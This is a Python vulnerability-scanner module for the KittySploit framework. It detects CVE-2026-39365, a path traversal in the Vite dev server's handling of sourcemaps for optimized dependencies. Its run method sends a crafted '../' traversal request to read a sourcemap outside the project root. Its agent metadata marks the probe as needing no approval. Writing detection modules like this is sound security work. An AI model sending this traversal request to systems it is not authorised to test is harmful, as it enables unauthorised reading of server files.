#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Vite development server versions prior to 8."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Vite Dev Server - Path Traversal in Optimized Deps .map Handling Detection',
        'description': "Vite development server versions prior to 8.0.5, 7.3.2, and 6.4.2 are vulnerable to path traversal through the optimized dependencies sourcemap handler. The dev server's handling of .map requests for optimized dependencies resolves file paths via normalizePath(path.resolve(root, url.slice(1))) and calls readFile without restricting ../ segments in the URL. This allows an attacker to bypass server.fs.strict and retrieve auto-generated sourcemaps for files located outside the project root, leaking absolute filesystem paths. Only dev servers explicitly exposed to the network using --host or server.host are affected.",
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'vite', 'lfi', 'path-traversal', 'vuln', 'unauthenticated', 'vkev'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 2,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.4,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'risk_signal',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/advisories/GHSA-4w7w-66w2-5vf9',
            'https://github.com/vitejs/vite/security/advisories/GHSA-4w7w-66w2-5vf9',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-39365',
        ],
        'cve': 'CVE-2026-39365',
    }

    def run(self):
        path = '/'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r:
            return False
        path = '/node_modules/.vite/deps/../../../config.production.js.map'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_all = ('"version":3', '"mappings"',)
        header_any = ('application/json',)
        body_regexes = ('"file":"/',)
        if (all(m in body for m in body_all)) and (any(m in headers for m in header_any)) and (any(re.search(rx, body) for rx in body_regexes)):
            self.set_info(severity='medium', reason='Vite Dev Server - Path Traversal in Optimized Deps .map Handling detected', path=path)
            return True
        return False

